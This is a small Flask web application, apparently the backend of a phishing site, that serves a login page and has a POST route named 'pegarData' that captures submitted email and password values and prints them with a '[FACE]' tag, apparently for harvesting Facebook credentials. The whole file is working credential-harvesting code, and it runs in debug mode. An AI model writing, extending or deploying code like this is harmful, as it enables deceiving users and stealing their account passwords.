from flask import Flask, render_template, jsonify, request




app = Flask(__name__)



@app.route("/")
def index():
    return render_template("page.html")


@app.route("/login")
def login():
    return render_template("login.html")



@app.route("/pegarData", methods=["POST"])
def pegarData():
    email = request.form["email"]
    passwd = request.form["passwd"]


    print(f"[FACE] {email} {passwd}")

    return jsonify({"":""})


if __name__ == "__main__":
    app.run(debug=True)